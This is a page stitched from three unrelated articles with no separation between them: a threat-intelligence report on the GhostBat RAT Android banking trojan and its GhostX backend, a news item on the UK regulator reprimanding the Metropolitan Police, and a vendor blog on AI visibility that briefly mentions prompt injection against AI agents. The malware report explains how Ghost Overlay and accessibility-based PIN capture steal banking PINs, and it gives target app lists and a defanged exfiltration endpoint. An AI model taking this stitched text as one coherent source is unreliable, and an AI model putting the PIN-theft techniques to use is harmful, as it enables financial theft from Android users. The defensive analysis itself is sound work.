Analysis of the exposed GhostX backend revealed evidence of a structured operator-management layer beyond conventional malware C&C functionality.

The database contained administrator and user records with role and account-status fields, a global session identifier, bot-user mappings, and dedicated admin_logins records containing device fingerprints, timestamps, and online status (see Figure 4).

These artifacts indicate that GhostX incorporates an authentication and session management framework for operator-side access and management of compromised devices.

The presence of distinct user, administrator, and bot-user roles suggests a multi-operator, service-oriented architecture. It raises the possibility that GhostX could support a Malware-as-a-Service-style operating model.

Figure 4 – Exposed administrative records.

During continued monitoring of the exposed infrastructure, we observed that SMS lure content, phishing URLs, vehicle registration numbers, and recipient phone numbers were repeatedly changing, indicating active operator-side campaign management rather than a static or abandoned database (see Figure 5).

Similar eChallan-themed messages were also observed being received by users in the wild, further supporting the campaign's operational nature (see Figure 6).

Figure 5 – Exposed SMS message configured to be sent to victims

Figure 6 – Same SMSs are being received by the victims (Source – Twitter Post)

One of the phishing URLs exposed through the GhostX infrastructure subsequently led us to a previously unseen GhostBat RAT variant, providing a direct investigative link among the backend control ecosystem, active phishing operations, and the malware's continued evolution.

These findings led us to assess that GhostX is not a single Android malware family or standalone application. Instead, GhostX represents a broader operator-controlled ecosystem encompassing phishing infrastructure, backend services, Firebase-based configuration and command mechanisms, device-management functionality, and malware distribution.

GhostBat RAT represents the Android implant operating within this ecosystem, with individual variants continuing to evolve across both delivery mechanisms and post-compromise capabilities.

Technical Analysis

Evolution of Droppers and Loaders

GhostBat RAT has undergone continuous changes in its delivery and payload-protection mechanisms.

Across the samples analyzed during the GhostX investigation, we identified multiple loader and dropper implementations designed to conceal the underlying malware payload, complicate static analysis, and reduce the effectiveness of hash- and signature-based detection.

Although the recovered payloads demonstrate overlapping capabilities for surveillance, financial theft, and device control, the mechanisms used to deliver and recover them vary considerably across samples.

Earlier variants relied on comparatively straightforward native loaders that decrypted embedded APK payloads using AES-CBC. Subsequent variants of Ghostbat RAT introduced XOR-encrypted custom containers, SPKZ/SPK1 packaging, split-APK delivery, dynamically loaded DEX components, and Java-based in-memory loaders.

One variant moved away from embedded payload delivery entirely. It operated as a remote downloader, retrieving a second-stage APK from remote infrastructure, validating its SHA-256 hash, and installing it through Android's package installation framework.

The most recent variant analyzed introduces a substantially more complex native loader implemented in libnetbridge.so. This loader combines multiple transformations, encryption, compression, and custom container stages before recovering the final GhostBat RAT payload.

This diversification indicates continued modification of the delivery layer while broadly retaining the malware's post-compromise objectives. Consequently, detections that focus only on the outer APK, the encrypted asset name, or a single unpacking routine are unlikely to provide durable coverage.

The GhostBat RAT loaders/droppers variants we observed are listed below:

Figure 7 – GhostBat RAT Loader variants

The most recent GhostBat RAT sample introduced a significantly more complex native unpacking mechanism.

Unlike earlier variants that relied primarily on Java-based loaders or comparatively straightforward XOR/AES routines, this variant stores the encrypted payload inside an opaque application asset, assets/isti52q4, while most of the unpacking logic is implemented in the native library libnetbridge.so.

The visible application code does not directly expose the final malicious functionality. Instead, execution transitions to the native loader, which processes the embedded asset through several sequential stages of transformation and decryption (see Figure 8).

Figure 8 – Latest native dropper unpacking chain

The first stage processes content within the encrypted asset file and derives values required for subsequent decoding. The resulting data is then passed through an RC4-like transformation before being processed through AES-256-GCM. This layered approach prevents the encrypted asset from being recovered using simple XOR or direct AES key extraction techniques that worked against earlier GhostBat RAT loaders.

Following successful decryption, the loader recovers an MSZ1-formatted intermediate object that is decompressed using zlib. The decompressed data contains an MSP1 container that packages the final Android application components.

The recovered payload consists of a split-APK application, including base.apk and split_config.dex.apk.

The executable malware code is primarily contained within the recovered split configuration DEX.

Unlike earlier samples, where the encrypted payload could be identified directly from ZIP headers or standard APK structures, the latest loader hides the final application behind several custom transformations before any recognizable Android package becomes available.

This significantly increases the effort required for automated unpacking and reduces the effectiveness of simple asset-scanning techniques.

Advanced GhostBat RAT Payload

GhostBat RAT has evolved from an Android SMS and information stealer into a modular remote-access and Banking Trojan.

Across the analyzed variants, the malware demonstrates capabilities for device profiling, SMS interception, remote SMS transmission, call-forwarding manipulation, payment-data theft, accessibility-based PIN capture, Firebase-driven command delivery, dynamic C&C configuration, and remote tunnelling.

In the new GhostBat RAT variant, we observed the introduction of Android Accessibility Service abuse, a technique commonly associated with modern Android Banking Trojans.

Earlier GhostBat RAT variants that we analyzed did not possess these capabilities during this investigation. The new variant uses Accessibility Service to monitor foreground applications, identify PIN-entry contexts, interact with application interfaces, and support two distinct credential-theft mechanisms: Ghost Overlay and targeted PIN/key-input capture.

Once Accessibility Services access is granted, the malware monitors the foreground application and compares it against configured target lists. These targets can be managed through Firebase Remote Config, allowing operators to selectively activate credential-capture functionality when a targeted banking, UPI, wallet, or payment application is in use.

Ghost Overlay

The most notable capability introduced in this variant is the Ghost Overlay technique.

Figure 9.1 – Ghost Overlay Attack Flow

Unlike conventional Android overlay attacks that display a fake login or payment page over the legitimate application, GhostBat RAT does not need to replace the victim's banking interface. Instead, it places transparent accessibility overlay regions directly over the real PIN keypad displayed by the targeted application.

The feature is controlled through Firebase Remote Config using:

ghost_overlay_enabled

ghost_overlay_packages

Figure 9.2 – Ghost overlay initialization activity

The default Ghost Overlay configuration targets the following Android packages:

com.mobikwik_new

com.google.android.apps.nbu.paisa

com.google.android.apps.nbu.paisa.user

Figure 10 – Target package list of Ghost Overlay activity

When the malware detects one of these applications in the foreground and identifies a PIN-related activity, it creates a transparent keypad grid using Android’s TYPE_ACCESSIBILITY_OVERLAY. The overlay contains 12 touch regions matching the layout of a typical numeric PIN pad (see Figures 11 and 12):

Figure 11 – Ghost PIN pad structure

Figure 12 – Ghost overlay activity

When the victim taps a digit on the legitimate Google Pay or MobiKwik PIN keypad, the transparent Ghost Overlay intercepts the touch event before it reaches the underlying application.

The malware maps the touch coordinates to the corresponding keypad value and appends the resulting digit to an internal buffer used to reconstruct the PIN.

To avoid interrupting the payment flow or alerting the victim, GhostBat RAT temporarily releases the affected overlay region and uses AccessibilityService.dispatchGesture() to reproduce the same tap at the corresponding screen coordinates (see Figure 13).

As a result, the legitimate application receives the expected input and continues operating normally, while the malware records the victim's PIN in parallel.

The same mechanism handles DEL and OK interactions, allowing the GhostBat RAT to update the captured digit sequence and detect when the PIN entry process has completed. This intercept-and-replay behavior enables the malware to observe PIN entry without presenting a fake Google Pay or MobiKwik interface.

Figure 13 – dispatchGesture activity

Once collected, the PIN is stored with metadata identifying the capture source as ghost_overlay and is subsequently queued for exfiltration over C&C “hxxps://api.cloudsettle[.]org/pin-data” (see Figure 14).

Figure 14 – Storing captured Ghost PIN

This technique is considerably stealthier than a conventional phishing overlay because the victim remains within the genuine financial application's interface throughout the interaction. GhostBat RAT effectively operates as an invisible intermediary, intercepting the victim's keypad interaction, recording the selected digits, and replaying those same touches into the legitimate application in near real time.

Targeted Keylogging and PIN Capture

In addition to the Ghost Overlay capability, the new GhostBat RAT variant implements a broader accessibility-based PIN/key-input capture mechanism targeting applications across India’s banking, UPI, wallet, fintech, and digital-payment ecosystem.

Unlike the Ghost Overlay feature, which is specifically designed to intercept keypad touches in Google Pay and MobiKwik via transparent overlay regions, this functionality relies on Android Accessibility Service events to monitor user interactions across a much larger set of targeted applications.

The default pin_target_packages configuration includes 60 Android package identifiers for financial applications used across India (see Figure 15).

The target set includes applications associated with Google Pay, PhonePe, Paytm, MobiKwik, BHIM, SBI UPI, Axis Pay, BharatPe, CRED, Freecharge, PayZapp, Groww, Navi, Jupiter, OneCard, JioFinance, Samsung Pay, and several other banking and payment services. The complete list of targeted Android packages is provided in the Targeted Application List section.

Once Accessibility Service is granted, GhostBat RAT monitors foreground activity and determines whether the currently running application(s) match an entry in pin_target_packages. The malware then evaluates the surrounding application and screen context before treating observed numeric input as potentially sensitive PIN information.

Figure 15 – PIN target package list

The malware also uses configurable PIN-length boundaries, pin_min_digits, and pin_min_digits to determine whether the reconstructed numeric sequence is consistent with an expected PIN.

Unlike Ghost Overlay, the broader keylogging mechanism does not rely on a transparent keypad overlay. Instead, GhostBat RAT uses Accessibility Service events and UI context to identify and reconstruct PIN-like input across a wider set of targeted financial applications, giving the malware substantially broader coverage within India’s banking and digital payment ecosystem.

The analyzed variant contains a dedicated worker responsible for handling captured PIN information, “PinUploadWorker”. Captured PINS are locally queued before being transmitted to the endpoint “/pin-data”.

Figure 16 – Captured PIN upload activity

The introduction of this capability substantially expands the financial targeting of GhostBat RAT. Earlier variants primarily relied on SMS interception, OTP theft, phishing interfaces, and call-forwarding manipulation.

The new variant can also monitor user interactions within legitimate financial applications and capture PIN-like input via Accessibility Service abuse.

Command and Control Infrastructure

The latest GhostBat RAT variant uses a multi-channel command-and-control architecture that combines a conventional HTTPS backend with Firebase services and a configurable WebSocket tunnel.

Compared with earlier variants, which relied more heavily on hardcoded infrastructure, the new implementation provides greater operational flexibility by allowing the attacker to modify backend addresses and enable or disable selected malware capabilities remotely.

In the analyzed sample, the default C&C infrastructure was configured as hxxps://api[.]cloudsettle[.]org. The malware communicates with this backend via multiple REST API endpoints that handle device registration, SMS collection, call log collection, command acknowledgement, PIN data submission, service state reporting, and other post-compromise functionality.

/sms/new

/sms/delivery-status

One of the major changes in the latest GhostBat RAT variant is the use of Firebase Remote Config as an additional control layer. The analyzed payload is associated with the Firebase project andromeda-d389d and retrieves remotely managed configuration values that control both infrastructure and malware functionality.

Of particular interest is the base_url parameter, which allows the operator to replace the active REST backend without modifying or redistributing the APK. Therefore, api.cloudsettle.org represents the observed/default backend for this sample rather than a permanently fixed C&C address.

Figure 17 – Dynamic C&C implementation

A similar dynamic C&C approach was observed during the GhostX investigation. An earlier NextGen mParivahan sample associated with the ghostx-panel Firebase project retrieved its backend configuration from Firestore using the app_config/network document and the baseUrl field.

In addition to the newly introduced Accessibility Service abuse, Ghost Overlay, targeted PIN capture, and dynamically configurable C&C functionality, GhostBat RAT continues to exhibit several core behaviors documented in our earlier research.

These include collecting SMS messages from compromised devices, monitoring newly received messages for banking- and OTP-related content, stealing UPI credentials through fraudulent mParivahan payment interfaces, and registering compromised devices with attacker-controlled infrastructure.

Earlier GhostBat RAT variants also used Telegram bots for device registration and operator notification, while selected dropper chains contained cryptocurrency-mining functionality alongside the information-stealing payload.

These previously documented capabilities remain important to the overall GhostBat RAT operation; however, the latest variants significantly expand the malware's financial-theft and remote-control functionality.

Rather than repeating the earlier functionality in detail, this analysis focuses on newly observed capabilities and architectural changes, particularly Accessibility Service abuse, Ghost Overlay PIN interception, broader targeting of financial applications, dynamic Firebase-based configuration, and evolving loader and C2 mechanisms.

Conclusion

The latest GhostBat RAT activity highlights continued evolution across both delivery mechanisms and post-compromise capabilities. The investigation into mParivahan- and eChallan-themed malware exposed the broader GhostX ecosystem, linking phishing infrastructure, backend control, and evolving GhostBat RAT payloads.

The introduction of Accessibility Service abuse, Ghost Overlay, broader PIN capture, and Firebase-driven dynamic configuration significantly expands the malware’s financial-theft capabilities while making the operation more adaptable. Combined with continuously evolving loaders and active phishing activity, GhostBat RAT remains a threat to Android users, particularly across India’s banking, UPI, and digital payment ecosystem.

Cyble’s Threat Intelligence Platforms continuously monitor emerging threats, infrastructure, and activity across the dark web, deep web, and open sources. This proactive intelligence empowers organizations with early detection, impersonation, infrastructure mapping, and attribution insights. Altogether, these capabilities provide a critical head start in mitigating and responding to evolving cyber threats.

CRIL’s analysis of this campaign has been selected for the upcoming Association of Anti-Virus Asia Researchers (AVAR) conference, where these findings will be showcased.

Our Recommendations

We have listed essential cybersecurity best practices that form the first line of defense against attackers. We recommend that our readers follow the best practices given below:

Install Apps Only from Trusted Sources:Download apps exclusively from official platforms like the Google Play Store. Avoid third-party app stores or links received via SMS, social media, or email.

Be Cautious with Permissions and Installs:Never grant permissions and install an application unless you're certain of an app's legitimacy.

Watch for Phishing Pages:Always verify the URL and avoid suspicious links and websites that ask for sensitive information.

Enable Multi-Factor Authentication (MFA):Use MFA for banking and financial apps to add an extra layer of protection, even if credentials are compromised.

Report Suspicious Activity:If you suspect you've been targeted or infected, report the incident to your bank and local authorities immediately. If necessary, reset your credentials and perform a factory reset.

Use Mobile Security Solutions:Install a mobile security application that includes real-time scanning.

Keep Your Device Updated: Ensure your Android OS and apps are updated regularly. Security patches often address vulnerabilities that malware exploits.

ICO Reprimands Met Over Third-Party Data Leak

UK / EMEA News Reporter, Infosecurity Magazine

The UK’s data protection regulator has issued a reprimand and enforcement notice to the capital’s police force after a string of governance failings related to its use of a third-party platform.

The investigation by the Information Commissioner’s Office (ICO) was focused on Metropolitan Police Service (MPS) use of the Auror retail crime intelligence-sharing platform, which it used in a crackdown on shoplifting.

The watchdog found that, between March 2023 and September 2024, MPS officers and staff used the platform despite it not being formally approved. Some 500 MPS accounts were created, of which 375 were active, it said in its writeup of the case.

Auror provides high-level summaries of incidents, case management, data visualisation and reporting, and a “Connect the Dots” module, which uses image matching and manual suggestions to identify links between events and individuals. It has been lauded as quadrupling the number of shoplifters brought to justice in London.

However, the ICO said that between January and September 2024 personal information including names, dates of birth and home addresses relating to 179 people – three of whom were under 18 – was uploaded to the unvetted platform.

Read more on MPS privacy woes: ICO Reprimands Metropolitan Police for Data Snafu

Two “security incident reports” were raised internally at the time. In the first, an officer uploaded the full names of suspects they recognized in CCTV images shared by a retailer. In the second, officers were flagged as using the platform to collect CCTV images from retailers despite Auror not having been approved by the MPS cybersecurity team.

The ICO found four infringements. It said the MPS:

Unlawfully processed personal information without the individual’s consent and where sharing wasn’t necessary for law enforcement purposes

Failed to implement “appropriate technical and organizational measures” to protect personal information and follow proper assessment and approval processes for third-party technologies

Failed to complete a data protection impact assessment (DPIA) before undertaking high-risk processing

Continues to fail to implement appropriate measures to ensure only approved third-party technologies are used to process personal information

David Doodson, ICO head of investigations, said police forces must have robust safeguards in place to protect the large volumes of sensitive personal information they handle.

“Organizations cannot allow innovation to outpace their data protection responsibilities. Before introducing new systems or platforms, they must properly assess the risks, put appropriate safeguards in place and ensure effective oversight,” he added.

“This action should send a message across the policing sector, and beyond: if you are using new technology to process people's information you must do so lawfully, transparently and with appropriate governance from the outset.”

Who’s Watching AI? The Visibility Gap Security Teams Need to Close

#SMB Security #Enterprise Security #Podcast #AI

By Bruce Sussman / Oct 15, 2026

Who’s Watching AI? The Visibility Gap Security Teams Need to Close

AI adoption isn't waiting for security teams.

Employees are experimenting with new tools. Business leaders are pushing teams to use AI to work faster. Applications are adding AI functionality. AI agents are accessing files, connecting to tools, and taking action as if they were employees.

This has tremendous potential.

But there's also a fundamental cybersecurity problem: Do you know what AI is doing inside your organization, or is it a growing blind spot?

That's the question at the center of a new episode of Cybercrime: From the Frontline, Who’s Watching AI? Managing Innovation Without Losing Control.

Watch or listen to the full conversation to hear Bitdefender experts explore how organizations can embrace AI innovation while managing its risks.

How Many Organizations Lack Full AI Visibility?

The 2026 Bitdefender Cybersecurity Assessment reveals that 44.8% of IT and cybersecurity professionals have only partial visibility into employee AI use. Another roughly 3% report having no visibility at all.

The independent research surveyed 1,200 IT and cybersecurity professionals across six countries and shows how widespread the lack of AI visibility and control has become. And the challenge is growing because employees have powerful incentives to experiment. AI can accelerate development, automate repetitive work, analyze information, and help meet increasingly aggressive productivity expectations.

Has Shadow IT Become Shadow AI?

Shadow AI introduces similar challenges to Shadow IT, but with potentially greater consequences.

With Shadow IT, an employee installs an unauthorized application. A department adopts a cloud service without consulting IT. Someone stores corporate information in a personal file-sharing account.

With Shadow AI, an employee might use a personal AI account instead of an approved enterprise platform. Someone could paste confidential information into a free AI service. An approved application might gain new AI capabilities through an update.

In each case, sensitive information could move somewhere security teams didn't anticipate. That's particularly concerning given that data leakage into large language models ranks among the leading AI-related concerns identified in the 2026 Cybersecurity Assessment.

According to experts on the podcast episode, AI adoption often happens without IT or security oversight, making visibility an enterprise-wide responsibility.

Why Is AI Becoming an Identity Problem?

Traditional generative AI responds to requests. Agentic AI can interact with tools, access files, connect to services, write code, and take actions. During the podcast, our experts suggest thinking about these agents as non-human identities operating inside the organization.

That raises important questions:

Which agents are operating in your environment?

What actions are they permitted to take?

And what happens if an agent is manipulated?

The podcast also explores prompt injection, where malicious instructions embedded within content can influence an AI system into performing unintended actions. If an agent has access to corporate systems, the question isn't simply whether you trust the AI.

What Does AI Visibility Look Like Today?

A simple inventory isn't enough. To achieve AI visibility, organizations must be able to identify the AI services and agents operating across their environments. Security teams need context on those tools, including their capabilities, permissions, connections, potential risks, and the endpoints they affect.

They also need to distinguish sanctioned AI use from unknown or potentially dangerous activity. Without that understanding, organizations risk applying blanket restrictions that frustrate employees or overlooking exposures that genuinely threaten the business.

Visibility provides the foundation for prioritizing risk and applying appropriate controls.

What Kinds of Tools Create AI Visibility and Control?

Organizations increasingly need specialized capabilities that discover AI usage, assess exposure, and translate security policies into action. One example is Bitdefender GravityZone AI Visibility and Control, which helps security teams identify more than 700 AI tools, including chatbots, coding assistants, local LLMs, agents, MCP servers, and AI-enabled applications. It creates a centralized inventory and helps prioritize findings based on risk and business context.

Importantly, GravityZone goes beyond discovery. Security teams can review and investigate findings, then use integrated controls to allow, restrict, or block AI activity. For existing GravityZone customers, these capabilities operate through the same agent and console, helping organizations manage AI exposure without adding another disconnected security tool.

How Can AI Governance Keep Pace With AI Adoption?

Technology is part of the answer, but AI governance must also become part of acceptable-use policies, employee education, procurement reviews, third-party risk assessments, and conversations between security and business leaders.

Some organizations are establishing dedicated AI steering committees. Others are incorporating AI into existing security and risk governance. The structure matters less than the outcome: security needs to participate in AI adoption decisions before deploying new tools.

Can Organizations Innovate Without Losing Control?

According to the podcast episode's experts, organizations can continue AI innovation without losing control, but only with a sound strategy. Instead of putting the brakes on AI adoption, organizations should make approved AI easier to use safely, educate employees about the risks of unsanctioned tools, use technology to track where sensitive information moves, and establish controls based on actual usage.

As AI agents become more capable, organizations must also understand and constrain agent permissions, just as they would for human identities.

Together, these measures can help make AI innovation sustainable.
